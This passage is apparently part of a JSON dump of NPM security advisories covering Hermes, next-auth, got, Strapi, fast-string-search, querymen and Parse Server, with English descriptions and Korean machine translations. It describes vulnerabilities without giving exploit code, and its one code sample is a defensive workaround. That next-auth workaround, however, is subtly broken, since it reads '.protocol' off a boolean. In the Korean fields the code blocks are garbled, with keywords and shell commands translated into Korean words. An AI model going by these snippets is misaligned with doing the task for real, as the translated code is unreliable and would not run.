    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-24037\nhttps://github.com/facebook/hermes/commit/d86e185e485b6330216dee8e854455c694e3a36e\nhttps://www.facebook.com/security/advisories/CVE-2021-24037\nhttps://github.com/advisories/GHSA-mph8-6787-r8hw",
    "name": "hermes-engine",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.7.2",
    "identifier": "0.8.0",
    "descriptionKR": "hermes에서 해제 후 특정 오류 메시지를 내보내는 동안 d86e185e485b6330216dee8e854455c694e3a36e를 커밋하기 전에 사용하면 공격자가 조작된 JavaScript를 통해 임의의 코드를 실행할 수 있습니다. 이는 Hermes를 사용하는 응용 프로그램이 신뢰할 수 없는 JavaScript의 평가를 허용하는 경우에만 악용될 수 있습니다. 따라서 대부분의 React Native 애플리케이션은 영향을 받지 않습니다."
  },
  {
    "description": "By passing invalid javascript code where await and yield were called upon non-async and non-generator getter/setter functions, Hermes would invoke generator functions and error out on invalid await/yield positions. This could result in segmentation fault as a consequence of type confusion error, with a low chance of RCE. This issue affects Hermes versions prior to v0.10.0.",
    "identifiers": "GHSA : GHSA-7mhc-prgv-r3q4\nCVE : CVE-2021-24044",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:00:35Z",
    "publishedAt": "2022-01-16T00:00:45Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-24044\nhttps://www.facebook.com/security/advisories/cve-2021-24044\nhttps://github.com/advisories/GHSA-7mhc-prgv-r3q4",
    "name": "hermes-engine",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.9.0",
    "identifier": "0.10.0",
    "descriptionKR": "비동기 및 비제너레이터 getter/setter 함수에서 await 및 yield가 호출된 잘못된 자바스크립트 코드를 전달함으로써 Hermes는 생성기 함수를 호출하고 잘못된 await/yield 위치에서 오류를 발생시킵니다. 이로 인해 RCE 가능성이 낮은 유형 혼동 오류의 결과로 세분화 오류가 발생할 수 있습니다. 이 문제는 v0.10.0 이전의 Hermes 버전에 영향을 미칩니다."
  },
  {
    "description": "Azure ms-rest-nodeauth Library Elevation of Privilege Vulnerability",
    "identifiers": "GHSA : GHSA-qpfw-4m9x-rxx8\nCVE : CVE-2021-28458",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:02:48Z",
    "publishedAt": "2022-05-24T17:47:26Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-28458\nhttps://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-28458\nhttps://github.com/advisories/GHSA-qpfw-4m9x-rxx8",
    "name": "@azure/ms-rest-nodeauth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 3.0.7",
    "identifier": "3.0.8",
    "descriptionKR": "Azure ms-rest-nodeauth 라이브러리 권한 상승 취약성"
  },
  {
    "description": "### Impact\n\nAn attacker can send a request to an app using NextAuth.js with an invalid `callbackUrl` query parameter, which internally we convert to a `URL` object. The URL instantiation would fail due to a malformed URL being passed into the constructor, causing it to throw an unhandled error which led to our **API route handler timing out and logging in to fail**. This has been remedied in the following releases:\n\nnext-auth v3 users before version 3.29.5 are impacted. (We recommend upgrading to v4, as v3 is considered unmaintained. See our [migration guide](https://next-auth.js.org/getting-started/upgrade-v4))\n\nnext-auth v4 users before version 4.5.0 are impacted.\n\n### Patches\n\nWe've released patches for this vulnerability in:\n  \n- v3 - `3.29.5`\n- v4 - `4.5.0`\n\nYou can do:\n\n```sh\nnpm i next-auth@latest\n```\n\nor\n\n```sh\nyarn add next-auth@latest\n```\n\nor\n\n```sh\npnpm add next-auth@latest\n```\n\n(This will update to the latest v4 version, but you can change  `latest` to `3` if you want to stay on v3. This is not recommended.)\n\n### Workarounds\n\nIf for some reason you cannot upgrade, the workaround requires you to rely on [Advanced Initialization](https://next-auth.js.org/configuration/initialization#advanced-initialization). Here is an example:\n\n**Before:**\n\n```js\n// pages/api/auth/[...nextauth].js\nimport NextAuth from \"next-auth\"\n\nexport default NextAuth(/* your config */)\n```\n\n**After:**\n\n```js\n// pages/api/auth/[...nextauth].js\nimport NextAuth from \"next-auth\"\n\nfunction isValidHttpUrl(url) {\n  try {\n    return /^https?:/.test(url).protocol\n  } catch {\n    return false;\n  }\n}\n\nexport default async function handler(req, res) {\n  if (\n    req.query.callbackUrl &&\n    !isValidHttpUrl(req.query.callbackUrl)\n  ) {\n   return res.status(500).send('');\n  }\n  \n  return await NextAuth(req, res, /* your config */)\n}\n```\n\n\n### References\n\nThis vulnerability was discovered not long after https://github.com/nextauthjs/next-auth/security/advisories/GHSA-q2mx-j4x2-2h74 was published and is very similar in nature.\n\nRelated documentation:\n\n- https://next-auth.js.org/getting-started/client#specifying-a-callbackurl\n- https://next-auth.js.org/configuration/callbacks#redirect-callback\n\nA test case has been added so this kind of issue will be checked before publishing. See: https://github.com/nextauthjs/next-auth/commit/e498483b23273d1bfc81be68339607f88d411bd6\n\n### For more information\n\nIf you have any concerns, we request responsible disclosure, outlined here: https://next-auth.js.org/security#reporting-a-vulnerability\n\n### Timeline\n\nThe issue was reported 2022 June 10th, a response was sent out to the reporter in less than 2 hours, and a patch was published within 3 hours.",
    "identifiers": "GHSA : GHSA-g5fm-jp9v-2432\nCVE : CVE-2022-31093",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:04:22Z",
    "publishedAt": "2022-06-21T20:06:36Z",
    "references": "https://github.com/nextauthjs/next-auth/security/advisories/GHSA-g5fm-jp9v-2432\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31093\nhttps://github.com/nextauthjs/next-auth/commit/25517b73153332d948114bacdff3b5908de91d85\nhttps://github.com/nextauthjs/next-auth/commit/e498483b23273d1bfc81be68339607f88d411bd6\nhttps://next-auth.js.org/configuration/initialization#advanced-initialization\nhttps://github.com/advisories/GHSA-g5fm-jp9v-2432",
    "name": "next-auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.5.0",
    "identifier": "4.5.0",
    "descriptionKR": "### 영향\n\n공격자는 내부적으로 'URL' 개체로 변환되는 잘못된 'callbackUrl' 쿼리 매개변수와 함께 NextAuth.js를 사용하여 앱에 요청을 보낼 수 있습니다. 잘못된 형식의 URL이 생성자에 전달되어 URL 인스턴스화가 실패하여 처리되지 않은 오류가 발생하여 **API 경로 처리기 시간 초과 및 로그인 실패**가 발생했습니다. 이 문제는 다음 릴리스에서 해결되었습니다.\n\n버전 3.29.5 이전의 next-auth v3 사용자는 영향을 받습니다. (v3는 유지 관리되지 않는 것으로 간주되므로 v4로 업그레이드하는 것이 좋습니다. [마이그레이션 가이드](https://next-auth.js.org/getting-started/upgrade-v4)를 참조하세요.)\n\n버전 4.5.0 이전의 next-auth v4 사용자는 영향을 받습니다.\n\n### 패치\n\n다음 위치에서 이 취약점에 대한 패치를 릴리스했습니다.\n  \n- v3 - `3.29.5`\n- v4 - `4.5.0`\n\n넌 할 수있어:\n\n```쉬\nnpm i next-auth@latest\n```\n\n또는\n\n```쉬\n원사 추가 next-auth@latest\n```\n\n또는\n\n```쉬\npnpm add next-auth@latest\n```\n\n(이는 최신 v4 버전으로 업데이트되지만 v3을 유지하려면 `latest`를 `3`으로 변경할 수 있습니다. 권장하지 않습니다.)\n\n### 해결 방법\n\n어떤 이유로 업그레이드할 수 없는 경우 해결 방법을 사용하려면 [고급 초기화](https://next-auth.js.org/configuration/initialization#advanced-initialization)를 사용해야 합니다. 다음은 예입니다.\n\n**전에:**\n\n```js\n// 페이지/api/auth/[...nextauth].js\n\"next-auth\"에서 NextAuth 가져오기\n\n기본 NextAuth 내보내기(/* 구성 */)\n```\n\n**후에:**\n\n```js\n// 페이지/api/auth/[...nextauth].js\n\"next-auth\"에서 NextAuth 가져오기\n\n함수 isValidHttpUrl(url) {\n  노력하다 {\n    return /^https?:/.test(url).protocol\n  } 잡다 {\n    거짓을 반환합니다.\n  }\n}\n\n기본 비동기 함수 내보내기(req, res) {\n  만약에 (\n    req.query.callbackUrl &&\n    !isValidHttpUrl(req.query.callbackUrl)\n  ) {\n   res.status(500).send('')를 반환합니다.\n  }\n  \n  return await NextAuth(req, res, /* 구성 */)\n}\n```\n\n\n### 참조\n\n이 취약점은 https://github.com/nextauthjs/next-auth/security/advisories/GHSA-q2mx-j4x2-2h74가 게시된 지 얼마 되지 않아 발견되었으며 본질적으로 매우 유사합니다.\n\n관련 문서:\n\n- https://next-auth.js.org/getting-started/client#specifying-a-callbackurl\n- https://next-auth.js.org/configuration/callbacks#redirect-callback\n\n테스트 사례가 추가되어 게시하기 전에 이러한 종류의 문제를 확인합니다. 참조: https://github.com/nextauthjs/next-auth/commit/e498483b23273d1bfc81be68339607f88d411bd6\n\n### 자세한 내용은\n\n우려 사항이 있는 경우 https://next-auth.js.org/security#reporting-a-vulnerability에 설명된 책임 있는 공개를 요청합니다.\n\n### 타임라인\n\n문제는 2022년 6월 10일에 보고되었고, 2시간 이내에 기자에게 응답이 발송되었으며, 3시간 이내에 패치가 게시되었습니다."
  },
  {
    "description": "### Impact\n\nAn attacker can send a request to an app using NextAuth.js with an invalid `callbackUrl` query parameter, which internally we convert to a `URL` object. The URL instantiation would fail due to a malformed URL being passed into the constructor, causing it to throw an unhandled error which led to our **API route handler timing out and logging in to fail**. This has been remedied in the following releases:\n\nnext-auth v3 users before version 3.29.5 are impacted. (We recommend upgrading to v4, as v3 is considered unmaintained. See our [migration guide](https://next-auth.js.org/getting-started/upgrade-v4))\n\nnext-auth v4 users before version 4.5.0 are impacted.\n\n### Patches\n\nWe've released patches for this vulnerability in:\n  \n- v3 - `3.29.5`\n- v4 - `4.5.0`\n\nYou can do:\n\n```sh\nnpm i next-auth@latest\n```\n\nor\n\n```sh\nyarn add next-auth@latest\n```\n\nor\n\n```sh\npnpm add next-auth@latest\n```\n\n(This will update to the latest v4 version, but you can change  `latest` to `3` if you want to stay on v3. This is not recommended.)\n\n### Workarounds\n\nIf for some reason you cannot upgrade, the workaround requires you to rely on [Advanced Initialization](https://next-auth.js.org/configuration/initialization#advanced-initialization). Here is an example:\n\n**Before:**\n\n```js\n// pages/api/auth/[...nextauth].js\nimport NextAuth from \"next-auth\"\n\nexport default NextAuth(/* your config */)\n```\n\n**After:**\n\n```js\n// pages/api/auth/[...nextauth].js\nimport NextAuth from \"next-auth\"\n\nfunction isValidHttpUrl(url) {\n  try {\n    return /^https?:/.test(url).protocol\n  } catch {\n    return false;\n  }\n}\n\nexport default async function handler(req, res) {\n  if (\n    req.query.callbackUrl &&\n    !isValidHttpUrl(req.query.callbackUrl)\n  ) {\n   return res.status(500).send('');\n  }\n  \n  return await NextAuth(req, res, /* your config */)\n}\n```\n\n\n### References\n\nThis vulnerability was discovered not long after https://github.com/nextauthjs/next-auth/security/advisories/GHSA-q2mx-j4x2-2h74 was published and is very similar in nature.\n\nRelated documentation:\n\n- https://next-auth.js.org/getting-started/client#specifying-a-callbackurl\n- https://next-auth.js.org/configuration/callbacks#redirect-callback\n\nA test case has been added so this kind of issue will be checked before publishing. See: https://github.com/nextauthjs/next-auth/commit/e498483b23273d1bfc81be68339607f88d411bd6\n\n### For more information\n\nIf you have any concerns, we request responsible disclosure, outlined here: https://next-auth.js.org/security#reporting-a-vulnerability\n\n### Timeline\n\nThe issue was reported 2022 June 10th, a response was sent out to the reporter in less than 2 hours, and a patch was published within 3 hours.",
    "identifiers": "GHSA : GHSA-g5fm-jp9v-2432\nCVE : CVE-2022-31093",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:04:22Z",
    "publishedAt": "2022-06-21T20:06:36Z",
    "references": "https://github.com/nextauthjs/next-auth/security/advisories/GHSA-g5fm-jp9v-2432\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31093\nhttps://github.com/nextauthjs/next-auth/commit/25517b73153332d948114bacdff3b5908de91d85\nhttps://github.com/nextauthjs/next-auth/commit/e498483b23273d1bfc81be68339607f88d411bd6\nhttps://next-auth.js.org/configuration/initialization#advanced-initialization\nhttps://github.com/advisories/GHSA-g5fm-jp9v-2432",
    "name": "next-auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.29.5",
    "identifier": "3.29.5",
    "descriptionKR": "### 영향\n\n공격자는 내부적으로 'URL' 개체로 변환되는 잘못된 'callbackUrl' 쿼리 매개변수와 함께 NextAuth.js를 사용하여 앱에 요청을 보낼 수 있습니다. 잘못된 형식의 URL이 생성자에 전달되어 URL 인스턴스화가 실패하여 처리되지 않은 오류가 발생하여 **API 경로 처리기 시간 초과 및 로그인 실패**가 발생했습니다. 이 문제는 다음 릴리스에서 해결되었습니다.\n\n버전 3.29.5 이전의 next-auth v3 사용자는 영향을 받습니다. (v3는 유지 관리되지 않는 것으로 간주되므로 v4로 업그레이드하는 것이 좋습니다. [마이그레이션 가이드](https://next-auth.js.org/getting-started/upgrade-v4)를 참조하세요.)\n\n버전 4.5.0 이전의 next-auth v4 사용자는 영향을 받습니다.\n\n### 패치\n\n다음 위치에서 이 취약점에 대한 패치를 릴리스했습니다.\n  \n- v3 - `3.29.5`\n- v4 - `4.5.0`\n\n넌 할 수있어:\n\n```쉬\nnpm i next-auth@latest\n```\n\n또는\n\n```쉬\n원사 추가 next-auth@latest\n```\n\n또는\n\n```쉬\npnpm add next-auth@latest\n```\n\n(이는 최신 v4 버전으로 업데이트되지만 v3을 유지하려면 `latest`를 `3`으로 변경할 수 있습니다. 권장하지 않습니다.)\n\n### 해결 방법\n\n어떤 이유로 업그레이드할 수 없는 경우 해결 방법을 사용하려면 [고급 초기화](https://next-auth.js.org/configuration/initialization#advanced-initialization)를 사용해야 합니다. 다음은 예입니다.\n\n**전에:**\n\n```js\n// 페이지/api/auth/[...nextauth].js\n\"next-auth\"에서 NextAuth 가져오기\n\n기본 NextAuth 내보내기(/* 구성 */)\n```\n\n**후에:**\n\n```js\n// 페이지/api/auth/[...nextauth].js\n\"next-auth\"에서 NextAuth 가져오기\n\n함수 isValidHttpUrl(url) {\n  노력하다 {\n    return /^https?:/.test(url).protocol\n  } 잡다 {\n    거짓을 반환합니다.\n  }\n}\n\n기본 비동기 함수 내보내기(req, res) {\n  만약에 (\n    req.query.callbackUrl &&\n    !isValidHttpUrl(req.query.callbackUrl)\n  ) {\n   res.status(500).send('')를 반환합니다.\n  }\n  \n  return await NextAuth(req, res, /* 구성 */)\n}\n```\n\n\n### 참조\n\n이 취약점은 https://github.com/nextauthjs/next-auth/security/advisories/GHSA-q2mx-j4x2-2h74가 게시된 지 얼마 되지 않아 발견되었으며 본질적으로 매우 유사합니다.\n\n관련 문서:\n\n- https://next-auth.js.org/getting-started/client#specifying-a-callbackurl\n- https://next-auth.js.org/configuration/callbacks#redirect-callback\n\n테스트 사례가 추가되어 게시하기 전에 이러한 종류의 문제를 확인합니다. 참조: https://github.com/nextauthjs/next-auth/commit/e498483b23273d1bfc81be68339607f88d411bd6\n\n### 자세한 내용은\n\n우려 사항이 있는 경우 https://next-auth.js.org/security#reporting-a-vulnerability에 설명된 책임 있는 공개를 요청합니다.\n\n### 타임라인\n\n문제는 2022년 6월 10일에 보고되었고, 2시간 이내에 기자에게 응답이 발송되었으며, 3시간 이내에 패치가 게시되었습니다."
  },
  {
    "description": "The got package before 11.8.5 and 12.1.0 for Node.js allows a redirect to a UNIX socket.",
    "identifiers": "GHSA : GHSA-pfrx-2q88-qq97\nCVE : CVE-2022-33987",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:05:01Z",
    "publishedAt": "2022-06-19T00:00:21Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-33987\nhttps://github.com/sindresorhus/got/pull/2047\nhttps://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0\nhttps://github.com/sindresorhus/got/commit/861ccd9ac2237df762a9e2beed7edd88c60782dc\nhttps://github.com/sindresorhus/got/releases/tag/v11.8.5\nhttps://github.com/sindresorhus/got/releases/tag/v12.1.0\nhttps://github.com/advisories/GHSA-pfrx-2q88-qq97",
    "name": "got",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 11.8.5",
    "identifier": "11.8.5",
    "descriptionKR": "Node.js용 11.8.5 및 12.1.0 이전의 got 패키지는 UNIX 소켓으로의 리디렉션을 허용합니다."
  },
  {
    "description": "The got package before 11.8.5 and 12.1.0 for Node.js allows a redirect to a UNIX socket.",
    "identifiers": "GHSA : GHSA-pfrx-2q88-qq97\nCVE : CVE-2022-33987",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:05:01Z",
    "publishedAt": "2022-06-19T00:00:21Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-33987\nhttps://github.com/sindresorhus/got/pull/2047\nhttps://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0\nhttps://github.com/sindresorhus/got/commit/861ccd9ac2237df762a9e2beed7edd88c60782dc\nhttps://github.com/sindresorhus/got/releases/tag/v11.8.5\nhttps://github.com/sindresorhus/got/releases/tag/v12.1.0\nhttps://github.com/advisories/GHSA-pfrx-2q88-qq97",
    "name": "got",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 12.0.0, < 12.1.0",
    "identifier": "12.1.0",
    "descriptionKR": "Node.js용 11.8.5 및 12.1.0 이전의 got 패키지는 UNIX 소켓으로의 리디렉션을 허용합니다."
  },
  {
    "description": "Strapi before 3.0.2 could allow a remote authenticated attacker to bypass security restrictions because templates are stored in a global variable without any sanitation. By sending a specially crafted request, an attacker could exploit this vulnerability to update the email template for both password reset and account confirmation emails.",
    "identifiers": "GHSA : GHSA-65wv-528r-m892\nCVE : CVE-2020-13961",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:02:36Z",
    "publishedAt": "2022-05-24T17:21:16Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-13961\nhttps://github.com/strapi/strapi/pull/6599\nhttps://exchange.xforce.ibmcloud.com/vulnerabilities/183045\nhttps://github.com/strapi/strapi/releases/tag/v3.0.2\nhttps://github.com/advisories/GHSA-65wv-528r-m892",
    "name": "strapi",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.2",
    "identifier": "3.0.2",
    "descriptionKR": "3.0.2 이전의 Strapi는 템플릿이 위생 없이 전역 변수에 저장되기 때문에 원격 인증 공격자가 보안 제한을 우회하도록 허용할 수 있습니다. 특별히 제작된 요청을 전송함으로써 공격자는 이 취약점을 악용하여 암호 재설정 및 계정 확인 이메일 모두에 대한 이메일 템플릿을 업데이트할 수 있습니다."
  },
  {
    "description": "All versions of package fast-string-search are vulnerable to Denial of Service (DoS) when computations are incorrect for non-string inputs. One can cause the V8 to attempt reading from non-permitted locations and cause a segmentation fault due to the violation.",
    "identifiers": "GHSA : GHSA-4263-q746-94mw\nCVE : CVE-2022-22138",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:04:40Z",
    "publishedAt": "2022-06-18T00:00:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-22138\nhttps://snyk.io/vuln/SNYK-JS-FASTSTRINGSEARCH-2392367\nhttps://github.com/advisories/GHSA-4263-q746-94mw",
    "name": "fast-string-search",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.4.3",
    "descriptionKR": "패키지 fast-string-search의 모든 버전은 문자열이 아닌 입력에 대한 계산이 올바르지 않은 경우 서비스 거부(DoS)에 취약합니다. V8이 허용되지 않는 위치에서 읽기를 시도하고 위반으로 인해 분할 오류가 발생할 수 있습니다."
  },
  {
    "description": "All versions of package fast-string-search are vulnerable to Out-of-bounds Read due to incorrect memory freeing and length calculation for any non-string input as the source. This allows the attacker to read previously allocated memory.",
    "identifiers": "GHSA : GHSA-hmqg-p8f8-3qrw\nCVE : CVE-2022-25872",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:04:20Z",
    "publishedAt": "2022-06-18T00:00:19Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25872\nhttps://github.com/magiclen/node-fast-string-search/blob/c8dd9fc966abc80b327f509e63360f59e0de9fb5/src/fast-string-search.c%23L192\nhttps://snyk.io/vuln/SNYK-JS-FASTSTRINGSEARCH-2392368\nhttps://github.com/advisories/GHSA-hmqg-p8f8-3qrw",
    "name": "fast-string-search",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.4.3",
    "descriptionKR": "fast-string-search 패키지의 모든 버전은 소스로 문자열이 아닌 입력에 대한 잘못된 메모리 해제 및 길이 계산으로 인해 Out-of-bounds Read에 취약합니다. 이를 통해 공격자는 이전에 할당된 메모리를 읽을 수 있습니다."
  },
  {
    "description": "All versions of package querymen are vulnerable to Prototype Pollution if the parameters of exported function handler(type, name, fn) can be controlled by users without any sanitization. Note: This vulnerability derives from an incomplete fix of [CVE-2020-7600](https://security.snyk.io/vuln/SNYK-JS-QUERYMEN-559867).",
    "identifiers": "GHSA : GHSA-p23c-p8w2-ww5v\nCVE : CVE-2022-25871",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:04:20Z",
    "publishedAt": "2022-06-18T00:00:19Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25871\nhttps://snyk.io/vuln/SNYK-JS-QUERYMEN-2391488\nhttps://github.com/advisories/GHSA-p23c-p8w2-ww5v",
    "name": "querymen",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.1.4",
    "descriptionKR": "패키지 querymen의 모든 버전은 내보낸 함수 처리기의 매개 변수(유형, 이름, fn)를 사용자가 임의로 삭제하지 않고 제어할 수 있는 경우 Prototype Pollution에 취약합니다. 참고: 이 취약점은 [CVE-2020-7600](https://security.snyk.io/vuln/SNYK-JS-QUERYMEN-559867)의 불완전한 수정에서 파생됩니다."
  },
  {
    "description": "### Impact\nCertain types of invalid files requests are not handled properly and can crash the server. If you are running multiple Parse Server instances in a cluster, the availability impact may be low; if you are running Parse Server as a single instance without redundancy, the availability impact may be high.\n\n### Patches\nTo prevent this, invalid requests are now properly handled.\n\n### Workarounds\nNone\n\n### References\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-xw6g-jjvf-wwf9\n- https://github.com/parse-community/parse-server\n\n### For more information\n- For questions or comments about this vulnerability visit our [community forum](http://community.parseplatform.org/) or [community chat](http://chat.parseplatform.org/)\n- Report other vulnerabilities at [report.parseplatform.org](https://report.parseplatform.org/)\n",
    "identifiers": "GHSA : GHSA-xw6g-jjvf-wwf9\nCVE : CVE-2022-31089",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:05:02Z",
    "publishedAt": "2022-06-20T22:25:46Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-xw6g-jjvf-wwf9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31089\nhttps://github.com/parse-community/parse-server/commit/5be375dec2fa35425c1003ae81c55995ac72af92\nhttps://github.com/advisories/GHSA-xw6g-jjvf-wwf9",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.2.3",
    "identifier": "5.2.3",
    "descriptionKR": "### 영향\n특정 유형의 유효하지 않은 파일 요청은 제대로 처리되지 않으며 서버를 중단시킬 수 있습니다. 클러스터에서 여러 Parse Server 인스턴스를 실행하는 경우 가용성에 미치는 영향이 적을 수 있습니다. 중복 없이 Parse Server를 단일 인스턴스로 실행하는 경우 가용성에 미치는 영향이 클 수 있습니다.\n\n### 패치\n이를 방지하기 위해 잘못된 요청이 이제 적절하게 처리됩니다.\n\n### 해결 방법\n없음\n\n### 참조\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-xw6g-jjvf-wwf9\n- https://github.com/parse-community/parse-server\n\n### 자세한 내용은\n- 이 취약점에 대한 질문이나 의견이 있으시면 [커뮤니티 포럼](http://community.parseplatform.org/) 또는 [커뮤니티 채팅](http://chat.parseplatform.org/)을 방문하십시오.\n- [report.parseplatform.org](https://report.parseplatform.org/)에서 다른 취약점을 보고하세요."
  },
  {
    "description": "### Impact\nCertain types of invalid files requests are not handled properly and can crash the server. If you are running multiple Parse Server instances in a cluster, the availability impact may be low; if you are running Parse Server as a single instance without redundancy, the availability impact may be high.\n\n### Patches\nTo prevent this, invalid requests are now properly handled.\n\n### Workarounds\nNone\n\n### References\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-xw6g-jjvf-wwf9\n- https://github.com/parse-community/parse-server\n\n### For more information\n- For questions or comments about this vulnerability visit our [community forum](http://community.parseplatform.org/) or [community chat](http://chat.parseplatform.org/)\n- Report other vulnerabilities at [report.parseplatform.org](https://report.parseplatform.org/)\n",
    "identifiers": "GHSA : GHSA-xw6g-jjvf-wwf9\nCVE : CVE-2022-31089",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:05:02Z",
    "publishedAt": "2022-06-20T22:25:46Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-xw6g-jjvf-wwf9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31089\nhttps://github.com/parse-community/parse-server/commit/5be375dec2fa35425c1003ae81c55995ac72af92\nhttps://github.com/advisories/GHSA-xw6g-jjvf-wwf9",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.10.12",
    "identifier": "4.10.12",
    "descriptionKR": "### 영향\n특정 유형의 유효하지 않은 파일 요청은 제대로 처리되지 않으며 서버를 중단시킬 수 있습니다. 클러스터에서 여러 Parse Server 인스턴스를 실행하는 경우 가용성에 미치는 영향이 적을 수 있습니다. 중복 없이 Parse Server를 단일 인스턴스로 실행하는 경우 가용성에 미치는 영향이 클 수 있습니다.\n\n### 패치\n이를 방지하기 위해 잘못된 요청이 이제 적절하게 처리됩니다.\n\n### 해결 방법\n없음\n\n### 참조\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-xw6g-jjvf-wwf9\n- https://github.com/parse-community/parse-server\n\n### 자세한 내용은\n- 이 취약점에 대한 질문이나 의견이 있으시면 [커뮤니티 포럼](http://community.parseplatform.org/) 또는 [커뮤니티 채팅](http://chat.parseplatform.org/)을 방문하십시오.\n- [report.parseplatform.org](https://report.parseplatform.org/)에서 다른 취약점을 보고하세요."
  },
  {
    "description": "### Impact\nThe certificate in Apple Game Center auth adapter not validated. As a result, authentication could potentially be bypassed by making a fake certificate accessible via certain Apple domains and providing the URL to that certificate in an authData object.\n\n### Patches\nTo prevent this, a new `rootCertificateUrl` property is introduced to the Parse Server Apple Game Center auth adapter which takes the URL to the root certificate of Apple's Game Center authentication certificate. If no value is set, the `rootCertificateUrl` property defaults to the URL of the [current root certificate](https://developer.apple.com/news/?id=stttq465) as of May 27, 2022.\n\nKeep in mind that the root certificate can change at any time (expected to be announced by Apple) and that it is the developer's responsibility to keep the root certificate URL up-to-date when using the Parse Server Apple Game Center auth adapter.\n\n### Workarounds\nNone.\n\n### References\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-rh9j-f5f8-rvgc\n- https://developer.apple.com/news/?id=stttq465\n- https://github.com/parse-community/parse-server\n\n### More information\n* For questions or comments about this vulnerability visit our [community forum](http://community.parseplatform.org) or [community chat](http://chat.parseplatform.org)\n* Report other vulnerabilities at [report.parseplatform.org](https://report.parseplatform.org)\n\n",
    "identifiers": "GHSA : GHSA-rh9j-f5f8-rvgc\nCVE : CVE-2022-31083",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:04:31Z",
    "publishedAt": "2022-06-17T22:09:09Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-rh9j-f5f8-rvgc\nhttps://github.com/parse-community/parse-server/pull/8054/commits/0cc299f82e367518f2fe7a53b99f3f801a338cf4\nhttps://github.com/parse-community/parse-server/pull/8054/commits/2084b7c569697a5230e42511799eeac9219db5a9\nhttps://developer.apple.com/news/?id=stttq465\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31083\nhttps://github.com/parse-community/parse-server/pull/8054\nhttps://github.com/parse-community/parse-server/commit/ba2b0a9cb9a568817a114b132a4c2e0911d76df1\nhttps://github.com/advisories/GHSA-rh9j-f5f8-rvgc",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.2.2",
    "identifier": "5.2.2",
    "descriptionKR": "### 영향\nApple Game Center 인증 어댑터의 인증서가 확인되지 않았습니다. 결과적으로 특정 Apple 도메인을 통해 액세스할 수 있는 가짜 인증서를 만들고 authData 개체에 해당 인증서에 대한 URL을 제공하여 잠재적으로 인증을 우회할 수 있습니다.\n\n### 패치\n이를 방지하기 위해 Apple의 Game Center 인증 인증서의 루트 인증서에 대한 URL을 사용하는 Parse Server Apple Game Center 인증 어댑터에 새로운 `rootCertificateUrl` 속성이 도입되었습니다. 값이 설정되지 않은 경우 `rootCertificateUrl` 속성은 2022년 5월 27일 현재 [현재 루트 인증서](https://developer.apple.com/news/?id=stttq465)의 URL로 기본 설정됩니다.\n\n루트 인증서는 언제든지 변경될 수 있으며(Apple에서 발표할 것으로 예상됨) Parse Server Apple Game Center 인증 어댑터를 사용할 때 루트 인증서 URL을 최신 상태로 유지하는 것은 개발자의 책임임을 명심하십시오.\n\n### 해결 방법\n없음.\n\n### 참조\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-rh9j-f5f8-rvgc\n- https://developer.apple.com/news/?id=stttq465\n- https://github.com/parse-community/parse-server\n\n### 추가 정보\n* 이 취약점에 대한 질문이나 의견이 있으시면 [커뮤니티 포럼](http://community.parseplatform.org) 또는 [커뮤니티 채팅](http://chat.parseplatform.org)을 방문하십시오.\n* [report.parseplatform.org](https://report.parseplatform.org)에서 다른 취약점을 보고하세요."
  },
  {
